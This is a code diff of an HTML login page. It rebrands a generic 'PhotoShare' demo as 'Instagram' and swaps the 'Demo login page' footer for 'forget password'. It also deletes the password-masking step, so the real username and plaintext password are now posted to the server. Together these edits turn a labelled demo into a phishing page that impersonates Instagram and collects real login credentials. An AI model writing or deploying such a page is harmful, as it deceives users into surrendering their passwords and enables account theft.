@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>PhotoShare Login</title>
+<title>Instagram Login</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
@@ -109,7 +109,7 @@ button:hover {
     <!-- Logo -->
     <div class="logo">
         <div class="icon"></div>
-        <div class="name">PhotoShare</div>
+        <div class="name">Instagram</div>
     </div>
 
     <!-- Login form -->
@@ -119,16 +119,13 @@ button:hover {
         <button type="submit">Log In</button>
     </form>
 
-    <div class="footer">Demo login page</div>
+    <div class="footer">forget password</div>
 </div>
 
 <script>
 function sendData() {
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
-
-    // Mask password (real password never sent)
-    const maskedPassword = "*".repeat(password.length);
 
     fetch("/login", {
         method: "POST",
@@ -137,7 +134,7 @@ function sendData() {
         },
         body: JSON.stringify({
             username: username,
-            password_masked: maskedPassword
+            password: password
         })
     })
     .then(() => {
